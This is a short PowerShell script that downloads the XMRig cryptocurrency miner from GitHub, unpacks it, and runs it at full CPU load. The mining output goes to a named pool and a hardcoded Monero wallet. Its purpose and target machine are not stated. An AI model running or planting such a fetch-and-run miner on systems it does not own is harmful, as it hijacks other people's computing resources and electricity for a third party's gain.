Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip
.\xmrig\xmrig-6.22.2\xmrig.exe -o fastpool.xyz:10055 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3@Triage --cpu-priority 4 --cpu-max-threads-hint=100 --algo=rx/0
